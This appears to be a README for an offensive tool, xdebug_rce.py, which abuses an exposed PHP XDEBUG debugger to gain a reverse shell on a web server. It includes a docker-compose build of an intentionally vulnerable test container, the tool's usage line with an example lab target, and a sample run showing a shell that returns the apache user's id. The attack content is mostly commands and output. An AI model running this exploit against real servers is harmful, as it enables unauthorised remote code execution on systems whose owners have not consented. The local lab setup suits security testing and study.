# xdebug_rce.py

## Summary

XDEBUG is used for debug php applications. If it is enabled on webserver
we can abuse that to get a remote shell.

## Usage

Start docker container with if you want to test this locally

```sh
⬢  xdebug_rce  master ⦿ docker-compose build
Building vulnerable_xdebug
Step 1/10 : FROM centos:centos7.4.1708
 ---> d3949e34634c
Step 2/10 : RUN yum update -y
 ---> Using cache
 ---> 65453a478dc8
Step 3/10 : RUN yum --enablerepo=extras install -y epel-release httpd
 ---> Using cache
 ---> ee78cadbf3cf
Step 4/10 : RUN yum --enablerepo=extras install -y php php-pecl-xdebug
 ---> Using cache
 ---> 0d5876f43e68
Step 5/10 : COPY xdebug.ini /etc/php.d/
 ---> Using cache
 ---> 0ed31dedd2db
Step 6/10 : COPY phpinfo.php /var/www/html/phpinfo.php
 ---> Using cache
 ---> a5e3e0a3e724
Step 7/10 : RUN mkdir /var/log/php
 ---> Using cache
 ---> 559827a596b0
Step 8/10 : RUN chown apache /var/log/php
 ---> Using cache
 ---> f77442551010
Step 9/10 : EXPOSE 80
 ---> Using cache
 ---> 8df724920599
Step 10/10 : CMD ["/usr/sbin/httpd","-X"]
 ---> Using cache
 ---> babebfd1e3af
Successfully built babebfd1e3af
Successfully tagged xdebugrce_vulnerable_xdebug:latest

 ⬢  xdebug_rce  master ⦿ docker-compose up -d
Creating network "xdebugrce_default" with the default driver
Creating xdebugrce_vulnerable_xdebug_1 ... done

```

Verify that container is running.

```sh
⬢  xdebug_rce  master ⦿ docker ps
CONTAINER ID        IMAGE                         COMMAND                CREATED             STATUS              PORTS                  NAMES
e71d9b41d929        xdebugrce_vulnerable_xdebug   "/usr/sbin/httpd -X"   31 seconds ago      Up 30 seconds       0.0.0.0:8080->80/tcp   xdebugrce_vulnerable_xdebug_1
```

Run 

```sh
⬢  xdebug_rce  master ⦿ ./xdebug_rce.py

▐▄• ▄ ·▄▄▄▄  ▄▄▄ .▄▄▄▄· ▄• ▄▌ ▄▄ • ▄▄▄   ▄▄· ▄▄▄ .
 █▌█▌▪██▪ ██ ▀▄.▀·▐█ ▀█▪█▪██▌▐█ ▀ ▪▀▄ █·▐█ ▌▪▀▄.▀·
 ·██· ▐█· ▐█▌▐▀▀▪▄▐█▀▀█▄█▌▐█▌▄█ ▀█▄▐▀▀▄ ██ ▄▄▐▀▀▪▄
▪▐█·█▌██. ██ ▐█▄▄▌██▄▪▐█▐█▄█▌▐█▄▪▐█▐█•█▌▐███▌▐█▄▄▌
•▀▀ ▀▀▀▀▀▀▀•  ▀▀▀ ·▀▀▀▀  ▀▀▀ ·▀▀▀▀ .▀  ▀·▀▀▀  ▀▀▀
[nighter@nighter.se]

Usage: ./xdebug_rce.py <URL> <LHOST> <LPORT> <USERNAME> <PASSWORD>

EXAMPLE: ./xdebug_rce.py 'http://10.10.10.70/phpinfo.php' 10.10.14.24 1337
```        

Run the exploit.

```sh
⬢  xdebug_rce  master ⦿ ./xdebug_rce.py 'http://localhost:8080/phpinfo.php' 10.100.12.59 1337
[+] LHOST = 10.100.12.59
[+] LPORT = 1337
[+] Shell listen
[+] Payload = 9000
[+] Exploit
bash: /root/.bashrc: Permission denied
bash-4.2$ id
uid=48(apache) gid=48(apache) groups=48(apache)
```